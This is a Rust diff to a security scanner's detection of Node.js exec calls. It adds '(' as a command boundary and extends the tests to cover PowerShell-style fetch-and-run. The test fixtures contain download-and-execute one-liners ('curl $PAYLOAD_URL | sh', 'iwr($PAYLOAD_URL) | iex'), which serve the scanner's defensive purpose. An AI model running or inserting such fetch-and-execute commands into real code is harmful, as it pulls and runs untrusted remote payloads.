@@ -230,6 +230,7 @@ fn command_token_with_boundary(line: &str, token: &str) -> bool {
         let right_ok = after.is_empty()
             || after.starts_with(' ')
             || after.starts_with('\t')
+            || after.starts_with('(')
             || after.starts_with('|')
             || after.starts_with(';')
             || after.starts_with('&')
@@ -488,13 +489,16 @@ mod tests {
     /// a tab instead of a space.
     #[test]
     fn detect_node_process_exec_escalates_for_tab_separated_curl_invocation() {
-        let content = "const { exec } = require('child_process');\n\
-                       exec('curl\t$PAYLOAD_URL | sh');\n";
-        let lower = content.to_ascii_lowercase();
-        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
-        assert_eq!(findings.len(), 1);
-        assert_eq!(findings[0].severity, Severity::Medium);
-        assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+        for content in [
+            "const { exec } = require('child_process');\nexec('curl\t$PAYLOAD_URL | sh');\n",
+            "const { exec } = require('child_process');\nexec('iwr($PAYLOAD_URL) | iex');\n",
+        ] {
+            let lower = content.to_ascii_lowercase();
+            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
+            assert_eq!(findings[0].severity, Severity::Medium);
+            assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+        }
     }
 
     /// # Contract
@@ -524,6 +528,7 @@ mod tests {
     fn detect_node_process_exec_rejects_download_command_substrings() {
         for content in [
             "const { exec } = require('child_process');\nexec('mycurl\t$PAYLOAD_URL');\n",
+            "const { exec } = require('child_process');\nexec('kiwr($PAYLOAD_URL)');\n",
             "const { exec } = require('child_process');\nexec('mybash\t-c \"$PAYLOAD\"');\n",
         ] {
             let lower = content.to_ascii_lowercase();
